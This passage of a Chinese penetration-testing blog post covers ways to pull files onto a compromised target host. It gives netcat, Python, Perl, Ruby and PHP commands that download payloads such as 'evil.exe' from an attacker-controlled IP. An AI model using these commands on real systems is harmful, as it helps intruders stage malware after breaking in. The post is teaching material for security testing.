          <a href="#netcat（Windows-Linux）：" class="heading-link"><i class="fas fa-link"></i></a>netcat（Windows/Linux）：</h4>
      
        <h5 id="nc是一款安全工具，它还有其他的名字-Netcat，-Ncat-可用来做端口扫描，端口转发，连接远程系统等。它是一款拥有多种功能的CLI-工具，可以用来在网络上读、写以及重定向数据，它被设计成可以被脚本或其他程序调用的可靠的后端工具，同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。当目标主机上安装了ncat是我们可以使用ncat来实现文件下载，当然这种场景在实战中少之又少">
          <a href="#nc是一款安全工具，它还有其他的名字-Netcat，-Ncat-可用来做端口扫描，端口转发，连接远程系统等。它是一款拥有多种功能的CLI-工具，可以用来在网络上读、写以及重定向数据，它被设计成可以被脚本或其他程序调用的可靠的后端工具，同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。当目标主机上安装了ncat是我们可以使用ncat来实现文件下载，当然这种场景在实战中少之又少" class="heading-link"><i class="fas fa-link"></i></a>nc是一款安全工具，它还有其他的名字 Netcat， Ncat 可用来做端口扫描，端口转发，连接远程系统等。它是一款拥有多种功能的CLI 工具，可以用来在网络上读、写以及重定向数据，它被设计成可以被脚本或其他程序调用的可靠的后端工具，同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。当目标主机上安装了ncat是我们可以使用ncat来实现文件下载，当然这种场景在实战中少之又少~</h5>
      
        <h5 id="在远程服务器执行下列命令，eval-exe为要上传的文件：">
          <a href="#在远程服务器执行下列命令，eval-exe为要上传的文件：" class="heading-link"><i class="fas fa-link"></i></a>在远程服务器执行下列命令，eval.exe为要上传的文件：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 &lt; eval.exe</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/nc.png" alt="nc"></p>

        <h5 id="目标机执行">
          <a href="#目标机执行" class="heading-link"><i class="fas fa-link"></i></a>目标机执行</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.10.11 4444 &gt;evil.exe</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/nc1.png" alt="nc1"></p>

        <h4 id="Python（Windows-Linux）：">
          <a href="#Python（Windows-Linux）：" class="heading-link"><i class="fas fa-link"></i></a>Python（Windows/Linux）：</h4>
      
        <h5 id="Python是目前很受欢迎的主流脚本语言，当目标主机内安装了python时，我们可以在shell中使用python来实现远程文件下载：">
          <a href="#Python是目前很受欢迎的主流脚本语言，当目标主机内安装了python时，我们可以在shell中使用python来实现远程文件下载：" class="heading-link"><i class="fas fa-link"></i></a>Python是目前很受欢迎的主流脚本语言，当目标主机内安装了python时，我们可以在shell中使用python来实现远程文件下载：</h5>
      
        <h5 id="进入交互环境：">
          <a href="#进入交互环境：" class="heading-link"><i class="fas fa-link"></i></a>进入交互环境：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import urllib2</span><br><span class="line">&gt;&gt;&gt; res &#x3D; urllib2.urlopen(&#39;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.exe&#39;)</span><br><span class="line">&gt;&gt;&gt; file&#x3D; open(&#39;f.exe&#39;,&#39;w&#39;)</span><br><span class="line">&gt;&gt;&gt; file.write(res.read())</span><br><span class="line">&gt;&gt;&gt; file.close()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/python.png" alt="python"></p>
<p><strong>(3) 编程语言</strong></p>

        <h4 id="Perl：">
          <a href="#Perl：" class="heading-link"><i class="fas fa-link"></i></a>Perl：</h4>
      <p><strong>Perl是目前很受欢迎的主流脚本语言，linux主机一般都自带perl环境，我们可以在终端中使用vim创建 dowanload.pl 脚本，之后执行perl来实现远程文件下载：</strong></p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!perl</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl</span><br><span class="line">use LWP::Simple;</span><br><span class="line">getstore(&quot;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt&quot;,&quot;evil.exe&quot;);</span><br></pre></td></tr></table></div></figure>




        <h5 id="然后运行：">
          <a href="#然后运行：" class="heading-link"><i class="fas fa-link"></i></a>然后运行：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl download.pl</span><br></pre></td></tr></table></div></figure>




        <h4 id="Ruby：">
          <a href="#Ruby：" class="heading-link"><i class="fas fa-link"></i></a>Ruby：</h4>
      
        <h5 id="当目标主机内安装了Ruby时，使用vim创建一个download-rb的文件">
          <a href="#当目标主机内安装了Ruby时，使用vim创建一个download-rb的文件" class="heading-link"><i class="fas fa-link"></i></a>当目标主机内安装了Ruby时，使用vim创建一个download.rb的文件</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!ruby</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;ruby</span><br><span class="line">require &#39;net&#x2F;http&#39;</span><br><span class="line">Net::HTTP.start(&quot;192.168.10.11&quot;) &#123; |http|</span><br><span class="line">r &#x3D; http.get(&quot;&#x2F;eval.txt&quot;)</span><br><span class="line">open(&quot;eval.sh&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="然后shell-终端运行：">
          <a href="#然后shell-终端运行：" class="heading-link"><i class="fas fa-link"></i></a>然后shell 终端运行：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby download.rb</span><br></pre></td></tr></table></div></figure>




        <h4 id="PHP：">
          <a href="#PHP：" class="heading-link"><i class="fas fa-link"></i></a>PHP：</h4>
      
        <h5 id="当目标主机内安装了PHP时，我们可以在终端使用vim来编辑一个PHP脚本，之后执行PHP来实现远程文件下载：">
          <a href="#当目标主机内安装了PHP时，我们可以在终端使用vim来编辑一个PHP脚本，之后执行PHP来实现远程文件下载：" class="heading-link"><i class="fas fa-link"></i></a>当目标主机内安装了PHP时，我们可以在终端使用vim来编辑一个PHP脚本，之后执行PHP来实现远程文件下载：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $data &#x3D; @file(&quot;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval. txt&quot;);</span><br><span class="line">        $lf &#x3D; &quot;eval.exe&quot;;</span><br><span class="line">        $fh &#x3D; fopen($lf, &#39;w&#39;);</span><br><span class="line">        fwrite($fh, $data[0]);</span><br><span class="line">        fclose($fh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>


        <h5 id="或者">
          <a href="#或者" class="heading-link"><i class="fas fa-link"></i></a>或者</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $data &#x3D; @file(&quot;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt&quot;);</span><br><span class="line">file_put_contents(&#39;eval.sh&#39;,$data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>


        <h5 id="然后运行：-1">
          <a href="#然后运行：-1" class="heading-link"><i class="fas fa-link"></i></a>然后运行：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php download.php </span><br></pre></td></tr></table></div></figure>



<hr>

        <h4 id="本文内容参考自-https-xz-aliyun-com-t-7937-如有侵权，请联系删除！！！">
          <a href="#本文内容参考自-https-xz-aliyun-com-t-7937-如有侵权，请联系删除！！！" class="heading-link"><i class="fas fa-link"></i></a>本文内容参考自 https://xz.aliyun.com/t/7937 如有侵权，请联系删除！！！</h4>
      </div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://crlf01.github.io">crlf</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://crlf01.github.io/2020/10/09/Windows&amp;Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/">http://crlf01.github.io/2020/10/09/Windows&amp;Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://crlf01.github.io/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/10/10/Windows-Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%89%8D%E5%A5%8F/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Windows/Linux权限提升前奏</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/09/20/github+hexo%E8%B8%A9%E5%9D%91%E8%AE%B0/"><span class="paginator-prev__text">github+hexo搭建博客</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">
          一、前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E7%8E%AF%E8%8A%82%E4%B8%AD%EF%BC%8C%E6%88%91%E4%BB%AC%E6%9C%89%E6%97%B6%E4%BC%9A%E9%81%87%E5%88%B0%E4%B8%80%E4%BA%9B%E9%9C%80%E8%A6%81%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E5%9C%BA%E6%99%AF%EF%BC%8C%E6%AF%94%E5%A6%82%E5%9C%A8RCE%E7%9A%84%E7%8E%AF%E8%8A%82%E4%B8%AD%EF%BC%8C%E6%97%A0%E6%B3%95%E5%B0%86%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%86%99%E5%85%A5%EF%BC%9B%E5%86%8D%E6%AF%94%E5%A6%82%E8%AF%B4%E6%8F%90%E6%9D%83%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E6%97%A0%E6%B3%95%E4%B8%8A%E4%BC%A0EXP%E6%96%87%E4%BB%B6%EF%BC%9B%E5%BD%93%E7%84%B6%E5%AE%9E%E9%99%85%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%E8%BF%9C%E4%B8%8D%E6%AD%A2%E6%AD%A4%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E5%88%A9%E7%94%A8Windows-Linux%E7%9A%84%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E3%80%81%E8%87%AA%E5%B8%A6-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B7%A5%E5%85%B7%E6%9D%A5%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%B3%A8%E6%84%8F%E7%9B%AE%E5%BD%95%E4%B8%80%E5%AE%9A%E8%A6%81%E6%9C%89%E5%86%99%E5%85%A5%E6%9D%83%E9%99%90%E6%89%8D%E5%8F%AF%E4%BB%A5%E3%80%82"><span class="toc-number">1.1.</span> <span class="toc-text">
          在渗透测试的环节中，我们有时会遇到一些需要上传文件的场景，比如在RCE的环节中，无法将文件进行写入；再比如说提权的时候，无法上传EXP文件；当然实际中的应用场景远不止此，这个时候我们就可以尝试利用Windows&#x2F;Linux的一些命令、自带&#x2F;第三方工具来进行下载的操作，注意目录一定要有写入权限才可以。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">
          二、常见的文件下载方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%87%AA%E5%B8%A6%E5%91%BD%E4%BB%A4-%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text">
          (1) 自带命令&#x2F;工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell%EF%BC%88%E9%A1%BB%E5%A4%A7%E4%BA%8E-Server2003%E7%9A%84Windows%E7%89%88%E6%9C%AC%EF%BC%89%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">
          PowerShell（须大于 Server2003的Windows版本）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#certutil-%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F%EF%BC%88%E4%BB%85%E6%B5%8B%E8%AF%95%E4%BA%8603%E5%8F%8A%E4%BB%A5%E4%B8%8A%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">
          certutil 命令行程序（仅测试了03及以上）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bitsadmin%E5%B7%A5%E5%85%B7%EF%BC%9A%EF%BC%88Windows%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">
          Bitsadmin工具：（Windows）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP%E6%9C%8D%E5%8A%A1%EF%BC%88Windows-Linux%EF%BC%89%EF%BC%9A"><span class="toc-number">2.5.</span> <span class="toc-text">
          FTP服务（Windows&#x2F;Linux）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-File-Transfer-Protocol%EF%BC%8C%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE-%E6%98%AFTCP-IP-%E5%8D%8F%E8%AE%AE%E7%BB%84%E4%B8%AD%E7%9A%84%E5%8D%8F%E8%AE%AE%E4%B9%8B%E4%B8%80%E3%80%82FTP%E5%8D%8F%E8%AE%AE%E5%8C%85%E6%8B%AC%E4%B8%A4%E4%B8%AA%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86%EF%BC%8C%E5%85%B6%E4%B8%80%E4%B8%BAFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%85%B6%E4%BA%8C%E4%B8%BAFTP%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%8C%E5%85%B6%E4%B8%ADFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%A8%E6%9D%A5%E5%AD%98%E5%82%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8FTP%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%9A%E8%BF%87FTP%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE%E4%BD%8D%E4%BA%8EFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E8%B5%84%E6%BA%90%E3%80%82"><span class="toc-number">2.6.</span> <span class="toc-text">
          FTP(File Transfer Protocol，文件传输协议)是TCP&#x2F;IP 协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端，其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msiexec%E5%B7%A5%E5%85%B7%EF%BC%88Windows%EF%BC%89%EF%BC%9A"><span class="toc-number">2.7.</span> <span class="toc-text">
          msiexec工具（Windows）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mshta%E5%B7%A5%E5%85%B7%EF%BC%88Windows-%EF%BC%9A"><span class="toc-number">2.8.</span> <span class="toc-text">
          mshta工具（Windows&#x2F;：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wget%EF%BC%88Windows-Linux%EF%BC%89"><span class="toc-number">2.9.</span> <span class="toc-text">
          wget（Windows&#x2F;Linux）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#curl%EF%BC%88Windows-Linux%EF%BC%89%EF%BC%9A"><span class="toc-number">2.10.</span> <span class="toc-text">
          curl（Windows&#x2F;Linux）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat%EF%BC%88Windows-Linux%EF%BC%89%EF%BC%9A"><span class="toc-number">2.11.</span> <span class="toc-text">
          netcat（Windows&#x2F;Linux）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%EF%BC%88Windows-Linux%EF%BC%89%EF%BC%9A"><span class="toc-number">2.12.</span> <span class="toc-text">
          Python（Windows&#x2F;Linux）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Perl%EF%BC%9A"><span class="toc-number">2.13.</span> <span class="toc-text">
          Perl：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ruby%EF%BC%9A"><span class="toc-number">2.14.</span> <span class="toc-text">
          Ruby：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%EF%BC%9A"><span class="toc-number">2.15.</span> <span class="toc-text">
          PHP：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E6%96%87%E5%86%85%E5%AE%B9%E5%8F%82%E8%80%83%E8%87%AA-https-xz-aliyun-com-t-7937-%E5%A6%82%E6%9C%89%E4%BE%B5%E6%9D%83%EF%BC%8C%E8%AF%B7%E8%81%94%E7%B3%BB%E5%88%A0%E9%99%A4%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">2.16.</span> <span class="toc-text">
          本文内容参考自 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7937 如有侵权，请联系删除！！！</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">人间值得 未来可期</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/crlf01/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a><a class="sidebar-ov-social-item" href="https://www.zhihu.com/" target="_blank" rel="noopener" data-popover="知乎" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">知</span></a></div><div class="sidebar-ov-feed"></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">4</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">4</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span><a href="https://github.com/crlf01" rel="noopener" target="_blank">crlf</a></span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.2.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>托管于 <a href="https://github.com/crlf01/crlf01.github.io/tree/hexo" rel="noopener" target="_blank">crlf</a></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
  // 加载进度条的计时器
  var loadingTimer = null;

  // 重置页面 Y 方向上的滚动偏移量
  document.addEventListener('pjax:send', function () {
    $('.header-nav-menu').removeClass('show');
    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
      $('html').velocity('scroll', {
        duration: 500,
        offset: $('#header').height(),
        easing: 'easeInOutCubic'
      });
    }

    var loadingBarWidth = 20;
    var MAX_LOADING_WIDTH = 95;

    $('.loading-bar').addClass('loading');
    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    clearInterval(loadingTimer);
    loadingTimer = setInterval(function () {
      loadingBarWidth += 3;
      if (loadingBarWidth > MAX_LOADING_WIDTH) {
        loadingBarWidth = MAX_LOADING_WIDTH;
      }
      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    }, 500);
  }, false);

  window.addEventListener('pjax:complete', function () {
    clearInterval(loadingTimer);
    $('.loading-bar__progress').css('width', '100%');
    $('.loading-bar').removeClass('loading');
    setTimeout(function () {
      $('.loading-bar__progress').css('width', '0');
    }, 400);
    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
      $(this).remove();
    });
    $('script[data-pjax], #pjax-reload script').each(function () {
      $(this).parent().append($(this).remove());
    });

    if (Stun.utils.pjaxReloadBoot) {
      Stun.utils.pjaxReloadBoot();
    }
    if (Stun.utils.pjaxReloadScroll) {
      Stun.utils.pjaxReloadScroll();
    }
    if (Stun.utils.pjaxReloadSidebar) {
      Stun.utils.pjaxReloadSidebar();
    }
    if (false) {
      if (Stun.utils.pjaxReloadHeader) {
        Stun.utils.pjaxReloadHeader();
      }
      if (Stun.utils.pjaxReloadScrollIcon) {
        Stun.utils.pjaxReloadScrollIcon();
      }
      if (Stun.utils.pjaxReloadLocalSearch) {
        Stun.utils.pjaxReloadLocalSearch();
      }
    }
  }, false);
}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>